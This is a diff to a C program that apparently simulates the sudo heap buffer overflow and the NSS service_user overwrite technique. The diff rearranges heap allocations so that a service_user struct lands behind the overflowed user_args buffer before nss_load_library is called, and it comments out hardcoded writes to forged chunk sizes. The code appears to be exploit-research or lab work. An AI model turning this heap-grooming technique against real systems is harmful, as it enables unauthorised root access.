@@ -72,6 +72,7 @@ nss_load_library(service_user *ni)
 int main(int argc, char **argv)
 {
 	char *user_args;
+	service_user *ni;
 
 	// https://github.com/sudo-project/sudo/blob/8255ed69b9c426d90a10c6d68e8d2241d7f3260e/plugins/sudoers/sudoers.c#L863
 	/* set user_args */
@@ -86,6 +87,11 @@ int main(int argc, char **argv)
 		if (size == 0 || (user_args = malloc(size)) == NULL) {
 			exit(EXIT_FAILURE);
 		};
+
+		// allocate service_user behind user args
+		ni = malloc(sizeof(service_user));
+		ni->library = malloc(sizeof(service_library));
+		
 		/*
 		 * When running a command via a shell, the sudo front-end
 		 * escapes potential meta chars.  We unescape non-spaces
@@ -106,16 +112,12 @@ int main(int argc, char **argv)
 	}
 
 	// TODO: buffer overflow needs to fix the following addresses:
-	int *first_size = (void *)0x5655a1bc;
-	int *second_size = (void *)0x5655a1ec;
-	char *name = (void *)0x5655a1f0; // this is 0x5655a1e0 when started via GDB
-	*first_size = 0x00000031;
-	*second_size = 0x00000011;
-	strcpy(name, "X/X");
-
-	// allocated service_user behind heap buffer overflow
-	service_user *ni = malloc(sizeof(service_user));
-	ni->library = malloc(sizeof(service_library));
+	// int *first_size = (void *)0x5655a1bc;
+	// int *second_size = (void *)0x5655a1ec;
+	// char *name = (void *)0x5655a1f0; // this is 0x5655a1e0 when started via GDB
+	// *first_size = 0x00000031;
+	// *second_size = 0x00000011;
+	// strcpy(name, "X/X");
 
 	// call nss_load_libary behind heap buffer overflow
 	nss_load_library(ni);
